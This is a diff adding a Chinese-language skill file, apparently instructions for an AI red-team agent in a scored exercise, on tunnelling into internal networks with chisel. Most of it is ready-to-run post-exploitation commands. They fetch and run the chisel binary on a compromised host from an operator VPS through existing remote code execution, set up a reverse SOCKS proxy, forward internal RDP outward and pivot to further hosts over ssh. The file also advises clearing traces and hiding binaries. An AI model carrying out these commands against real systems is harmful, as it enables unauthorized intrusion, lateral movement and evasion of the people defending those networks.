@@ -1,1 +1,115 @@
-LS0tCm5hbWU6IGNoaXNlbC10dW5uZWwKZGVzY3JpcHRpb246IGNoaXNlbCDpmqfpgZPvvJpIVFRQL1dlYlNvY2tldCDlsIHoo4XnmoTlpJrot6/lpI3nlKjpmqfpgZPvvIzmnIDmmJPnqb/pgI/lh7rnvZHpmZDliLbkuI7lj43lkJHku6PnkIYKd2hlblRvVXNlOiBzdW81IOS4jemAgueUqO+8iOmdniBXZWJTaGVsbCDlhaXlj6PvvInjgIHnm67moIflj6rog73lh7ogSFRUUOOAgemcgOimgeerr+WPo+i9rOWPkeaIlueos+WumiBTT0NLUyDml7YKcm9sZTogaW50ZXJuYWwKZW5hYmxlZDogdHJ1ZQotLS0KCiMgY2hpc2Vs77yISFRUUCDpmqfpgZMgLyDnq6/lj6Povazlj5HvvIkKCj4gKirlhYjliqDovb0gVlBTIOmFjee9rioq77ya5pys5oqA6IO96YeM5omA5pyJIGAkUkVEVEVBTV9WUFNfSE9TVGAgLyBgJFZQU19VU0VSYCDpg73mnaXoh6rmnKzmnLrphY3nva7vvIwKPiDpppbmrKHnlLEgYGJhc2ggJERTSF9IT01FL3JlZHRlYW0vc2V0dXAuc2hgIOWGmeWFpSBgJERTSF9IT01FLy5lbnZg44CC5q+P5p2h5ZG95Luk5YmN5YWIIHNvdXJjZSDkuIDmrKHvvJoKPiBgYGBiYXNoCj4gc2V0IC1hOyAuICIkRFNIX0hPTUUvLmVudiIgMj4vZGV2L251bGwgfHwgLiAiJEhPTUUvLmRzaC8uZW52Ijsgc2V0ICthCj4gVlBTX1VTRVI9IiR7UkVEVEVBTV9WUFNfVVNFUjotdWJ1bnR1fSI7IFZQUz0iJFJFRFRFQU1fVlBTX0hPU1QiCj4gYGBgCj4g5rKh6YWN6L+H5bCx6LeR5LiA5qyhIGBzZXR1cC5zaGDvvIjmioDog70gYHJlZHRlYW0tc2V0dXBg77yJ77yM5a6D5ZCM5pe25Lya6aqM6K+BIFNTSCDov57pgJrmgKfkuI7ovb3ojbfmnI3liqHjgIIKCmBjaGlzZWxgIOaKiiBUQ1Ag5rWB6YeP5bCB6L+bICoqSFRUUC9XZWJTb2NrZXQqKu+8jOWboOatpCoq5pyA5a655piT56m/6L+H5Y+q5pS+6KGMIDgwLzQ0MyDnmoTlh7rnvZHnrZbnlaXkuI7lj43lkJHku6PnkIYqKuOAggrlroPlkowgc3VvNSDnmoTliIblt6XvvJoKCnwgfCBzdW81IHwgY2hpc2VsIHwKfCAtLS0gfCAtLS0gfCAtLS0gfAp8IOWFpeWPo+WJjeaPkCB8ICoq5b+F6aG75pyJIFdlYlNoZWxsKirvvIhIVFRQIOmAmumBk++8iSB8ICoq5Y+q6KaB5pyJ5ZG95Luk5omn6KGMKirvvIjog73ot5Hkuozov5vliLbljbPlj6/vvIkgfAp8IOS8oOi+kyB8IEhUVFAg6ZW/6L+e5o6l77yI5Lyq6KOF5oiQ5q2j5bi46K+35rGC77yJIHwgSFRUUC9XZWJTb2NrZXTvvIh1cGdyYWRl77yJIHwKfCDlvLrpobkgfCDku44gV2ViIOWFpeWPo+i/m+WGhee9ke+8jOeUqOaIt+WPr+WkjeeUqCB8IOS7jiBzaGVsbC9SQ0Ug5YWl5Y+j6L+b5YaF572R77yb56uv5Y+j6L2s5Y+R54G15rS7IHwKfCDlmarlo7AgfCDkvY7vvIjlg4/mma7pgJogV2ViIOivt+axgu+8iSB8IOS9ji3kuK3vvIhXZWJTb2NrZXQg54m55b6B5piO5pi+5Lqb77yJIHwKCioq6YCJ5oup5Y+j5b6EKirvvJrmnIkgV2ViU2hlbGwg4oaSIOS8mOWFiCBgc3VvNS10dW5uZWxg77yb5Y+q5pyJ5ZG95Luk5omn6KGML1JDRSDmiJbpnIDopoHnsr7noa7nq6/lj6Povazlj5Eg4oaSIOeUqCBjaGlzZWzjgIIKCiMjIOacrOacuuS6jOi/m+WItgoKfCDmlofku7YgfCDot6/lvoQgfAp8IC0tLSB8IC0tLSB8CnwgY2hpc2Vs77yITGludXggYW1kNjTvvIzmnI3liqHnq6/kuI7lrqLmiLfnq6/lkIzkuIDkuKrkuozov5vliLbvvIkgfCBgJERTSF9IT01FL3JlZHRlYW0vdG9vbGtpdC9jaGlzZWwvY2hpc2VsYO+8iHYxLjEyLjDvvIkgfAoK5bey5ZCM5q2l5YiwIFZQUyDovb3ojbfnm67lvZXvvJpgaHR0cDovLyRSRURURUFNX1ZQU19IT1NUOjkxMDAvYO+8iOebruagh+WPryBgY3VybGAg55u05o6l5ouJ77yJ44CCCgojIyDkuIDjgIHlj43lkJEgU09DS1PvvIjmnIDluLjnlKjvvJrnm67moIfkuLvliqjov57miJHku6zvvIkKCmBgYGJhc2gKIyAxKSDmiJHmlrkgVlBTIOi1t+acjeWKoeerr++8iHRtdXgg6YeM6LeR77yM5Yir6K6pIFNTSCDmlq3lvIDmnYDmjonvvIkKdG11eCBuZXcgLXMgY2hpc2VsCiREU0hfSE9NRS9yZWR0ZWFtL3Rvb2xraXQvY2hpc2VsL2NoaXNlbCBzZXJ2ZXIgLXAgOTQ0MyAtLXJldmVyc2UgLS1zb2NrczUKIyAgICAtLXJldmVyc2UgIOWFgeiuuOWuouaIt+err+azqOWGjOWPjeWQkemap+mBkwojICAgIC0tc29ja3M1ICAg5byA5ZCv5YaF572uIFNPQ0tTNe+8iOWuouaIt+err+i/nuS4iuWQjuivpeerr+WPo+WNs+WPr+eUqO+8iQojICAgIOWPr+mAieWKoOWbuu+8mi0tYXV0aCB1c2VyOnBhc3MgICDliqDorqTor4HvvIzpgb/lhY3ooqvmiavliLDnmb3nlKgKIyAgICDlj6/pgInkvKroo4XvvJotLWJhY2tlbmQgaHR0cDovLzEyNy4wLjAuMTo4MCAg5oqKIFdlYiDmtYHph4/ovazlj5HliLDmnKzlnLDnq5nngrkKCiMgMikg55uu5qCH5L6n6LW35a6i5oi356uv77yI6YCa6L+H5bey5pyJ55qEIFJDRS/lkb3ku6TmiafooYzngrnot5HvvJvlhYjmiorkuozov5vliLbmi4nkuIrljrvvvIkKY3VybCAtcyBodHRwOi8vJFJFRFRFQU1fVlBTX0hPU1Q6OTEwMC9jaGlzZWwgLW8gL3RtcC9jICYmIGNobW9kICt4IC90bXAvYwovdG1wL2MgY2xpZW50ICRSRURURUFNX1ZQU19IT1NUOjk0NDMgUjpzb2NrcwojICAgIFI6c29ja3MgPSDlj43lkJEgU09DS1PvvJvov57kuIrlkI4gVlBTIOeahCAxMDgwIOerr+WPo+WNs+S4uuWGhee9kSBTT0NLUzUg5YWl5Y+jCgojIDMpIOacrOacuumAmui/hyBWUFMg55qEIFNPQ0tTIOiuv+mXruWGhee9kQpwcm94eWNoYWluczQgLWYgcnVucy9wcm94eWNoYWlucy0xMDgwLmNvbmYgY3VybCAtcyBodHRwOi8vMTAuMC4wLjUvCiMgICAgcnVucy9wcm94eWNoYWlucy0xMDgwLmNvbmYg6YeM5YaZ77yac29ja3M1ICRSRURURUFNX1ZQU19IT1NUIDEwODAKIyAgICDim5Qg5LiN6KaB5pS557O757ufIC9ldGMvcHJveHljaGFpbnM0LmNvbmbvvIznlKggLWYg5oyH5ZCRIHJ1bnMvIOS4i+eahOS4tOaXtumFjee9rgpgYGAKCiMjIOS6jOOAgeWPjeWQkeerr+WPo+i9rOWPke+8iOaKiuWGhee9keafkOS4querr+WPo+aYoOWwhOWHuuadpe+8iQoKYGBgYmFzaAojIOebruagh+S+p++8muaKiuWGhee9kSAxMC4wLjAuNTozMzg5IOaYoOWwhOWIsCBWUFMg55qEIDEzMzg5Ci90bXAvYyBjbGllbnQgJFJFRFRFQU1fVlBTX0hPU1Q6OTQ0MyBSOjEzMzg5OjEwLjAuMC41OjMzODkKIyDmnKzmnLrvvJrnm7TmjqXov54gVlBTOjEzMzg5IOWNs+S4uuWGhee9kSAzMzg5CnJkZXNrdG9wICRSRURURUFNX1ZQU19IT1NUOjEzMzg5CmBgYAoKIyMg5LiJ44CB5q2j5ZCRIFNPQ0tT77yI55uu5qCH6IO955u06L+e5oiR5Lus44CB5L2G5oiR5Lus6KaB5Li75Yqo6L+e55uu5qCH5YaF572R77yJCgpgYGBiYXNoCiMg55uu5qCH5L6n6LW35pyN5Yqh56uvCi90bXAvYyBzZXJ2ZXIgLXAgOTQ0MyAtLXNvY2tzNQojIOaIkeaWuei1t+WuouaIt+err+WBmuacrOWcsOi9rOWPkQpjaGlzZWwgY2xpZW50IDx0YXJnZXQ+Ojk0NDMgMTA4MDpzb2NrcwojIOS5i+WQjiBwcm94eWNoYWlucyDmjIflkJEgMTI3LjAuMC4xOjEwODAKYGBgCgojIyDlm5vjgIHlpJrnuqcgLyDogZTliqgKCmBgYGJhc2gKIyDlt7LmnIkgQSDpmqfpgZPvvIhzdW81IOKGkiAxMjcuMC4wLjE6MTA4MO+8ie+8jOimgemAmui/hyBBIOWcqOWGhee9keS4u+acuiBCIOS4iuWGjei1tyBjaGlzZWwKcHJveHljaGFpbnM0IC1mIHJ1bnMvcHJveHljaGFpbnMtMTA4MC5jb25mIFwKICBzc2ggdXNlckAxMC4wLjAuNiAiY3VybCAtcyBodHRwOi8vJFJFRFRFQU1fVlBTX0hPU1Q6OTEwMC9jaGlzZWwgLW8gL3RtcC9jICYmIGNobW9kICt4IC90bXAvYyAmJiBub2h1cCAvdG1wL2MgY2xpZW50ICRSRURURUFNX1ZQU19IT1NUOjk0NDMgUjpzb2NrczIgJiIKIyDpgJDlsYLmianlpKflj6/ovr7ojIPlm7TvvIzmr4/lsYLpg73opoHnmbvorrDpmqfpgZPkuI7lj6/ovr7nvZHmrrUKYGBgCgojIyDkupTjgIHnuqrlvovkuI7oh6rkv50KCjEuICoq5b+F6aG76LeR5ZyoIHRtdXggLyBub2h1cCDph4wqKu+8muS8muivneaWreW8gOmap+mBk+WwseayoeS6hu+8iGBub2h1cCAuLi4gJmAg5oiWIGB0bXV4YO+8ieOAggoyLiAqKuacjeWKoeerr+WKoOiupOivgSoq77ya5YWs572RIFZQUyDkuIrnmoQgY2hpc2VsIOacjeWKoeerr+S8muiiq+aJq+err+WPo++8jOWKoCBgLS1hdXRoIHVzZXI6cGFzc2DvvIznlKjlrowgYHBraWxsYCDlhbPmjonjgIIKMy4gKirnq6/lj6PpgInmi6kqKu+8muWIq+eUqCA4MC80NDPvvIjlj6/og73ooqsgVlBTIOS4iuWIq+eahOacjeWKoeWNoOeUqO+8ie+8jOeUqCA5NDQzLzg0NDMg562J6auY5L2N56uv5Y+j77ybCiAgICoqVlBTIOWuieWFqOe7hOimgeaUvuihjCoq44CCCjQuICoq55uu5qCH5L6n6JC95Zyw6KaB5riF55CG55eV6L+55LiO5paH5Lu2KirvvJpgL3RtcC9jYCDnlKjlrozlj6/liKDvvJvms6jmhI/liKvmiorkuozov5vliLbmlL7lnKjmnInmmI7mmL7nibnlvoHnmoTot6/lvoTjgIIKNS4gKirkuI3opoHnlKjoh6rlu7ogVlBTIOS4iueahOS7o+eQhuWGkuWFhSLnqoHnoLQiKirvvJrpmqfpgZPnmbvorrAgYGVudHJ5X2tpbmRgIOW/hemhu+ivtOa4heebruagh+S+p+mCo+S4gOerr++8iOingeS4i++8ieOAggoKIyMg5YWt44CB6L6T5Ye65LiO6JC95bqT77yI5by65Yi277yJCgoxLiAqKumap+mBk+eZu+iusCBgcmVkdGVhbV90dW5uZWxfYWRkYCoq77yM5a2X5q615b+F6aG75YaZ5YWo77yaCiAgIC0gYGtpbmRg77yaYGNoaXNlbGDvvJsKICAgLSBgbGlzdGVuYO+8mioq55So5oi35a6e6ZmF6IO955So55qE55uR5ZCs5Zyw5Z2AKirvvIjlpoIgYCRSRURURUFNX1ZQU19IT1NUOjEwODBgIOaIliBgMTI3LjAuMC4xOjEwODBg77yJ77ybCiAgIC0gYGVudHJ5YO+8muebruagh+S+p+eahOWFpeWPo++8iOWmgiBgMTAuMC4wLjYg5LiK55qEIC90bXAvYyDlrqLmiLfnq68g4oaSIFZQUzo5NDQzYO+8ie+8mwogICAtIGByZWFjaGDvvJoqKuWPr+i+vue9keautSoq77yI5aaCIGAxMC4wLjAuMC8yNGDvvIzlrp7mtYvlh7rmnaXlho3loavvvIzliKvnjJzvvInvvJsKICAgLSBgZW50cnlfa2luZGDvvJoqKuW/hemhu+aYryBgdGFyZ2V0LW91dGJvdW5kYCoq77yI55uu5qCH5Y+N5by5L+ebruagh+S4iui3kSBjaGlzZWwg5a6i5oi356uv77yJ5oiWCiAgICAgYHRhcmdldC1odHRwYO+8iOe7j+ebruaghyBXZWJTaGVsbO+8ieOAgWB0YXJnZXQtYWdlbnRg77yI57uP55uu5qCH5bey5o6n6L+b56iL77yJ77ybCiAgICAg4puUIOWPquWcqOiHquW3sSBWUFMg5LiK5byA5Luj55CG5aGrIGBzZWxmLW9ubHlg4oCU4oCUKirkvJrooqvmoIci5LiN566X56qB56C0Iioq77ybCiAgIC0gYGNvbW1hbmRg77ya5a6M5pW05ZG95Luk5Y6f5paH77yI5pyN5Yqh56uvICsg5a6i5oi356uv5Lik5q616YO96KaB77yJ44CCCjIuICoq5a6e5rWL6L+e6YCa5oCnKirvvJpgY3VybCAtLXNvY2tzNS1ob3N0bmFtZSA8bGlzdGVuPiBodHRwOi8vPOWGhee9keebruaghz4vYCDmiJYgYHByb3h5Y2hhaW5zNCAtZiAuLi4gY3VybCAuLi5g77yMCiAgIOmAmuS6huaJjeeul+map+mBk+aIkOeri++8m+eEtuWQjiBgcmVkdGVhbV9zZXNzaW9uX2NoZWNrYCDlm57lhpnnirbmgIHjgIIKMy4gKirlvpfliIYqKu+8mumap+mBk+WPr+i+vuWGhee9kSDihpIgYHJlZHRlYW1fc2NvcmVfaGl0YO+8iGBib3VuZGFyeWDvvIxldmlkZW5jZSDlhpnjgIzpmqfpgZPlnLDlnYDvvZzlj6/ovr7nvZHmrrXvvZzlrp7mtYvorr/pl67liLDnmoTlhoXnvZHnm67moIfjgI3vvInvvJsKICAg6YCa6L+H5a6D5qiq5ZCR5Yiw5YW25a6D5Li75py6IOKGkiBgc2VydmVyLWhvc3Rg44CCCjQuICoq5Lqk5LuY57uZ55So5oi3KirvvJrnu5nlh7rlj6/nm7TmjqXnspjotLTnmoTphY3nva7igJTigJRgc29ja3M1Oi8vPGxpc3Rlbj5g77yI5oiWIGBzc2ggLURgIC8gZnJwIOaYoOWwhOWIsOeUqOaIt+acuuWZqOeahOaWueazle+8ie+8jAogICDlhpnmuIXnm5HlkKzlnLDlnYDkuI7nq6/lj6PvvIzlubbor7TmmI7or6XpmqfpgZPot6jotorkuobpnbbmoIfovrnnlYzjgIIKNS4g5q+P5Liq5YWz6ZSu5Yqo5L2cIGByZWR0ZWFtX2NoYWluX2FkZGDvvIhgc3RhZ2VfY29kZT1ib3VuZGFyeS1sb2dpY2FsYO+8ie+8jGB0b29sYCDlhpnlkb3ku6Tljp/mlofjgIFgcmVzdWx0YCDlhpnlm57mmL7mkZjopoHjgIIK
+---
+name: chisel-tunnel
+description: chisel 隧道：HTTP/WebSocket 封装的多路复用隧道，最易穿透出网限制与反向代理
+whenToUse: suo5 不适用（非 WebShell 入口）、目标只能出 HTTP、需要端口转发或稳定 SOCKS 时
+role: internal
+enabled: true
+---
+
+# chisel（HTTP 隧道 / 端口转发）
+
+> **先加载 VPS 配置**：本技能里所有 `$REDTEAM_VPS_HOST` / `$VPS_USER` 都来自本机配置，
+> 首次由 `bash $DSH_HOME/redteam/setup.sh` 写入 `$DSH_HOME/.env`。每条命令前先 source 一次：
+> ```bash
+> set -a; . "$DSH_HOME/.env" 2>/dev/null || . "$HOME/.dsh/.env"; set +a
+> VPS_USER="${REDTEAM_VPS_USER:-ubuntu}"; VPS="$REDTEAM_VPS_HOST"
+> ```
+> 没配过就跑一次 `setup.sh`（技能 `redteam-setup`），它同时会验证 SSH 连通性与载荷服务。
+
+`chisel` 把 TCP 流量封进 **HTTP/WebSocket**，因此**最容易穿过只放行 80/443 的出网策略与反向代理**。
+它和 suo5 的分工：
+
+| | suo5 | chisel |
+| --- | --- | --- |
+| 入口前提 | **必须有 WebShell**（HTTP 通道） | **只要有命令执行**（能跑二进制即可） |
+| 传输 | HTTP 长连接（伪装成正常请求） | HTTP/WebSocket（upgrade） |
+| 强项 | 从 Web 入口进内网，用户可复用 | 从 shell/RCE 入口进内网；端口转发灵活 |
+| 噪声 | 低（像普通 Web 请求） | 低-中（WebSocket 特征明显些） |
+
+**选择口径**：有 WebShell → 优先 `suo5-tunnel`；只有命令执行/RCE 或需要精确端口转发 → 用 chisel。
+
+## 本机二进制
+
+| 文件 | 路径 |
+| --- | --- |
+| chisel（Linux amd64，服务端与客户端同一个二进制） | `$DSH_HOME/redteam/toolkit/chisel/chisel`（v1.12.0） |
+
+已同步到 VPS 载荷目录：`http://$REDTEAM_VPS_HOST:9100/`（目标可 `curl` 直接拉）。
+
+## 一、反向 SOCKS（最常用：目标主动连我们）
+
+```bash
+# 1) 我方 VPS 起服务端（tmux 里跑，别让 SSH 断开杀掉）
+tmux new -s chisel
+$DSH_HOME/redteam/toolkit/chisel/chisel server -p 9443 --reverse --socks5
+#    --reverse  允许客户端注册反向隧道
+#    --socks5   开启内置 SOCKS5（客户端连上后该端口即可用）
+#    可选加固：--auth user:pass   加认证，避免被扫到白用
+#    可选伪装：--backend http://127.0.0.1:80  把 Web 流量转发到本地站点
+
+# 2) 目标侧起客户端（通过已有的 RCE/命令执行点跑；先把二进制拉上去）
+curl -s http://$REDTEAM_VPS_HOST:9100/chisel -o /tmp/c && chmod +x /tmp/c
+/tmp/c client $REDTEAM_VPS_HOST:9443 R:socks
+#    R:socks = 反向 SOCKS；连上后 VPS 的 1080 端口即为内网 SOCKS5 入口
+
+# 3) 本机通过 VPS 的 SOCKS 访问内网
+proxychains4 -f runs/proxychains-1080.conf curl -s http://10.0.0.5/
+#    runs/proxychains-1080.conf 里写：socks5 $REDTEAM_VPS_HOST 1080
+#    ⛔ 不要改系统 /etc/proxychains4.conf，用 -f 指向 runs/ 下的临时配置
+```
+
+## 二、反向端口转发（把内网某个端口映射出来）
+
+```bash
+# 目标侧：把内网 10.0.0.5:3389 映射到 VPS 的 13389
+/tmp/c client $REDTEAM_VPS_HOST:9443 R:13389:10.0.0.5:3389
+# 本机：直接连 VPS:13389 即为内网 3389
+rdesktop $REDTEAM_VPS_HOST:13389
+```
+
+## 三、正向 SOCKS（目标能直连我们、但我们要主动连目标内网）
+
+```bash
+# 目标侧起服务端
+/tmp/c server -p 9443 --socks5
+# 我方起客户端做本地转发
+chisel client <target>:9443 1080:socks
+# 之后 proxychains 指向 127.0.0.1:1080
+```
+
+## 四、多级 / 联动
+
+```bash
+# 已有 A 隧道（suo5 → 127.0.0.1:1080），要通过 A 在内网主机 B 上再起 chisel
+proxychains4 -f runs/proxychains-1080.conf \
+  ssh user@10.0.0.6 "curl -s http://$REDTEAM_VPS_HOST:9100/chisel -o /tmp/c && chmod +x /tmp/c && nohup /tmp/c client $REDTEAM_VPS_HOST:9443 R:socks2 &"
+# 逐层扩大可达范围，每层都要登记隧道与可达网段
+```
+
+## 五、纪律与自保
+
+1. **必须跑在 tmux / nohup 里**：会话断开隧道就没了（`nohup ... &` 或 `tmux`）。
+2. **服务端加认证**：公网 VPS 上的 chisel 服务端会被扫端口，加 `--auth user:pass`，用完 `pkill` 关掉。
+3. **端口选择**：别用 80/443（可能被 VPS 上别的服务占用），用 9443/8443 等高位端口；
+   **VPS 安全组要放行**。
+4. **目标侧落地要清理痕迹与文件**：`/tmp/c` 用完可删；注意别把二进制放在有明显特征的路径。
+5. **不要用自建 VPS 上的代理冒充"突破"**：隧道登记 `entry_kind` 必须说清目标侧那一端（见下）。
+
+## 六、输出与落库（强制）
+
+1. **隧道登记 `redteam_tunnel_add`**，字段必须写全：
+   - `kind`：`chisel`；
+   - `listen`：**用户实际能用的监听地址**（如 `$REDTEAM_VPS_HOST:1080` 或 `127.0.0.1:1080`）；
+   - `entry`：目标侧的入口（如 `10.0.0.6 上的 /tmp/c 客户端 → VPS:9443`）；
+   - `reach`：**可达网段**（如 `10.0.0.0/24`，实测出来再填，别猜）；
+   - `entry_kind`：**必须是 `target-outbound`**（目标反弹/目标上跑 chisel 客户端）或
+     `target-http`（经目标 WebShell）、`target-agent`（经目标已控进程）；
+     ⛔ 只在自己 VPS 上开代理填 `self-only`——**会被标"不算突破"**；
+   - `command`：完整命令原文（服务端 + 客户端两段都要）。
+2. **实测连通性**：`curl --socks5-hostname <listen> http://<内网目标>/` 或 `proxychains4 -f ... curl ...`，
+   通了才算隧道成立；然后 `redteam_session_check` 回写状态。
+3. **得分**：隧道可达内网 → `redteam_score_hit`（`boundary`，evidence 写「隧道地址｜可达网段｜实测访问到的内网目标」）；
+   通过它横向到其它主机 → `server-host`。
+4. **交付给用户**：给出可直接粘贴的配置——`socks5://<listen>`（或 `ssh -D` / frp 映射到用户机器的方法），
+   写清监听地址与端口，并说明该隧道跨越了靶标边界。
+5. 每个关键动作 `redteam_chain_add`（`stage_code=boundary-logical`），`tool` 写命令原文、`result` 写回显摘要。
